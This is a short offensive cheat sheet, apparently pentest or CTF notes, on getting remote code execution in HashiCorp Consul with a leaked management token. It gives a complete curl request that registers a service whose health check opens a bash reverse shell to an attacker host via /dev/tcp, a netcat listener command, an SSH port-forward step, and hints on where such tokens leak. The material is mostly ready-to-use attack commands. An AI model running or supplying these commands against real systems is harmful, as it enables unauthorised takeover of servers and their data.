# Consul Health Check RCE via Management Token

If you find a Consul management/ACL token (e.g. leaked in a Git commit, config file, or environment variable), register a service with a health-check script to get RCE.

```bash
# Token often found in: git log, .env, consul config files, Grafana datasource config
# Grafana → admin panel → Data Sources → shows MySQL creds → MySQL DB may store Consul token

# Register a service with a shell health-check script
curl -X PUT http://<TARGET>:8500/v1/agent/service/register \
  -H "X-Consul-Token: <TOKEN>" \
  -d '{
    "ID": "pwn",
    "Name": "pwn",
    "Address": "127.0.0.1",
    "Port": 80,
    "Check": {
      "DeregisterCriticalServiceAfter": "90m",
      "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],
      "Interval": "10s",
      "Timeout": "86400s"
    }
  }'

# The check runs immediately then every 10s — start your listener:
nc -lvnp <LPORT>
```

If Consul is on a non-default port or behind a firewall, use SSH port forwarding first:
```bash
ssh -L 8500:127.0.0.1:8500 <USER>@<TARGET>
```
